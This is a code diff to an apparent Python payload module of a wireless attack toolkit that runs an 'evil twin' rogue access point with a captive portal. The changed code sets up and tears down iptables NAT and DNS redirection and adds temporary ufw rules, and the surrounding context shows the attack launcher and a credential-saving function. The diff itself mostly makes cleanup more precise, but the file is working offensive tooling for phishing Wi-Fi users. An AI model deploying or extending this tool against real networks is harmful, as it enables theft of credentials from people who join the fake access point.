@@ -22,6 +22,7 @@ from urllib.parse import parse_qs
 sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))
 
 from payloads._iface_helper import list_interfaces, supports_monitor
+from payloads._ufw import TemporaryUfwRules
 from payloads._web_input import request_input
 
 
@@ -96,6 +97,7 @@ _dnsmasq_proc = None
 _portal_server = None
 _iface = None
 _original_iface_state = None
+_firewall = None
 
 # ---------------------------------------------------------------------------
 # AP scanning
@@ -325,8 +327,6 @@ def _save_credential(cred):
 def _setup_iptables(iface):
     """Configure NAT and DNS redirect."""
     cmds = [
-        ["sudo", "iptables", "-t", "nat", "-F"],
-        ["sudo", "iptables", "-F"],
         ["sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
          "-i", iface, "-p", "tcp", "--dport", "80",
          "-j", "DNAT", "--to-destination", f"{GATEWAY_IP}:{PORTAL_PORT}"],
@@ -337,7 +337,7 @@ def _setup_iptables(iface):
          "-i", iface, "-p", "udp", "--dport", "53",
          "-j", "DNAT", "--to-destination", f"{GATEWAY_IP}:53"],
         ["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING",
-         "-j", "MASQUERADE"],
+         "-s", f"{GATEWAY_IP}/24", "-j", "MASQUERADE"],
         ["sudo", "sh", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward"],
     ]
     for cmd in cmds:
@@ -346,9 +346,19 @@ def _setup_iptables(iface):
 
 def _teardown_iptables():
     """Remove iptables rules."""
+    iface = _iface
     cmds = [
-        ["sudo", "iptables", "-t", "nat", "-F"],
-        ["sudo", "iptables", "-F"],
+        ["sudo", "iptables", "-t", "nat", "-D", "PREROUTING",
+         "-i", iface, "-p", "tcp", "--dport", "80",
+         "-j", "DNAT", "--to-destination", f"{GATEWAY_IP}:{PORTAL_PORT}"],
+        ["sudo", "iptables", "-t", "nat", "-D", "PREROUTING",
+         "-i", iface, "-p", "tcp", "--dport", "443",
+         "-j", "DNAT", "--to-destination", f"{GATEWAY_IP}:{PORTAL_PORT}"],
+        ["sudo", "iptables", "-t", "nat", "-D", "PREROUTING",
+         "-i", iface, "-p", "udp", "--dport", "53",
+         "-j", "DNAT", "--to-destination", f"{GATEWAY_IP}:53"],
+        ["sudo", "iptables", "-t", "nat", "-D", "POSTROUTING",
+         "-s", f"{GATEWAY_IP}/24", "-j", "MASQUERADE"],
         ["sudo", "sh", "-c", "echo 0 > /proc/sys/net/ipv4/ip_forward"],
     ]
     for cmd in cmds:
@@ -364,7 +374,7 @@ def _teardown_iptables():
 
 def _start_attack(target_ap):
     """Launch the evil twin: hostapd + dnsmasq + portal."""
-    global _hostapd_proc, _dnsmasq_proc, _portal_server
+    global _hostapd_proc, _dnsmasq_proc, _portal_server, _firewall
     global attack_running, status_msg, view_mode
 
     iface = _iface
@@ -395,6 +405,10 @@ def _start_attack(target_ap):
     # Write configs
     _write_hostapd_conf(iface, ssid, channel)
     _write_dnsmasq_conf(iface)
+    _firewall = TemporaryUfwRules("evil-twin")
+    _firewall.allow_ap_dhcp(iface, f"{GATEWAY_IP}/24")
+    _firewall.allow_ap_service(iface, f"{GATEWAY_IP}/24", 53, "udp")
+    _firewall.allow_ap_service(iface, f"{GATEWAY_IP}/24", PORTAL_PORT, "tcp")
 
     # Kill existing instances
     for proc_name in ("hostapd", "dnsmasq"):
@@ -461,7 +475,7 @@ def _portal_serve_loop():
 
 def _stop_attack():
     """Stop all attack processes and clean up."""
-    global _hostapd_proc, _dnsmasq_proc, _portal_server
+    global _hostapd_proc, _dnsmasq_proc, _portal_server, _firewall
     global attack_running, status_msg
 
     with lock:
@@ -507,6 +521,9 @@ def _stop_attack():
 
     # Teardown iptables
     _teardown_iptables()
+    if _firewall:
+        _firewall.close()
+        _firewall = None
 
     # Restore interface
     if _iface:
